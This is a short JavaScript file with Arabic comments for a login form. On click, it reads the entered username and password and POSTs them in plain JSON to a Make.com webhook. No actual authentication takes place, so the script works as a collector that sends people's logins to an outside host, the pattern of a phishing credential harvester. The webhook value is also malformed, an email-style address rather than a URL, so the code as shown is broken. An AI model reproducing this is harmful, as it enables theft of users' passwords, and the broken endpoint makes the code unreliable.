document.addEventListener("DOMContentLoaded", function () {
    const loginButton = document.getElementById("loginButton");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");

    loginButton.addEventListener("click", function (event) {
        event.preventDefault(); // منع إعادة تحميل الصفحة

        const username = usernameInput.value;
        const password = passwordInput.value;

        // 🔴 استبدل هذا بالرابط الذي نسخته من Make.com
        const webhookURL = "t4hl4g02d2lek81vmto0m44es49vt1pl@hook.eu2.make.com";

        // إرسال البيانات إلى Make.com
        fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => response.json())
        .then(data => console.log("✅ البيانات تم إرسالها:", data))
        .catch(error => console.error("❌ خطأ أثناء الإرسال:", error));
    });
});
